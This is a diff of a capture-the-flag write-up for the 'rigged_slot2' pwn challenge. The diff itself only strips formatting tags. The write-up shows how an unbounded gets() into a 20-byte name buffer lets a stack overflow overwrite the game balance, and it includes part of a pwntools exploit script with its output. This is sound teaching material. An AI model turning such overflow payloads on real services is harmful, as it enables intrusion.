@@ -32,7 +32,6 @@ I mentioned that part 1 of this challenge was an unintended solution I caught be
 
 We don't know what the winning condition is yet but since it's a pwn challenges, let's check the binary protections.
 
-{% code overflow="wrap" %}
 
 ```bash
 checksec --file rigged_slot2
@@ -44,11 +43,9 @@ checksec --file rigged_slot2
     PIE:      PIE enabled
 ```
 
-{% endcode %}
 
 No canaries, so potentially a buffer overflow for us to exploit. We'll check the disassembled code in `ghidra` soon. First, let's run the binary and see if it looks different to part 1.
 
-{% code overflow="wrap" %}
 
 ```bash
 nc localhost 1337
@@ -80,13 +77,11 @@ Current Balance: $0
 You're out of money! Game over!
 ```
 
-{% endcode %}
 
 It looks similar, apart from the `name` entry at the beginning and the terrible odds (try your brute force script from part 1 if you like).
 
 I've renamed some of the variables in `ghidra`.
 
-{% code overflow="wrap" %}
 
 ```c
 setup_alarm(5);
@@ -119,11 +114,9 @@ printf("Invalid bet amount! Please bet an amount between $1 and $%d.\n",100);
 } while( true );
 ```
 
-{% endcode %}
 
 Similar to last time, but we need to hit a balance of `$1,337,420` within the 5 minute time limit (I might of reduced to 2-3 mins, can't remember). Checking the odds, they are terrible 😫
 
-{% code overflow="wrap" %}
 
 ```c
 outcome = rand();
@@ -148,11 +141,9 @@ else {
 }
 ```
 
-{% endcode %}
 
 Soooo.. Back to this buffer overflow! The `name` buffer shows as 20 bytes in ghidra, but there is no limit to how much the user can provide (dangerous `gets()` function).
 
-{% code overflow="wrap" %}
 
 ```c
 void enter_name(char *name)
@@ -164,11 +155,9 @@ void enter_name(char *name)
 }
 ```
 
-{% endcode %}
 
 Let's test this! Enter a long string (over 20) as the name and play some games.
 
-{% code overflow="wrap" %}
 
 ```bash
 nc localhost 1337
@@ -191,13 +180,11 @@ You lost $10.
 Current Balance: $1094795555
 ```
 
-{% endcode %}
 
 That's a lot of money!! We overwrite the balance on the stack 😌 We need exactly `1337420` though, let's automate it into a script.
 
 ### solve.py
 
-{% code overflow="wrap" %}
 
 ```python
 from pwn import *
@@ -226,11 +213,9 @@ io.sendlineafter(b"Enter your name:", payload)
 io.interactive()
 ```
 
-{% endcode %}
 
 Give it a run ✅
 
-{% code overflow="wrap" %}
 
 ```bash
 python solve.py REMOTE 127.0.0.1 1337
@@ -264,6 +249,5 @@ Enter your bet amount (up to $100 per spin): $ 1
     b"Congratulations! You've won the jackpot! Here is your flag: INTIGRITI{fake_flag}\r\n"
 ```
 
-{% endcode %}
 
 Flag: `INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}`
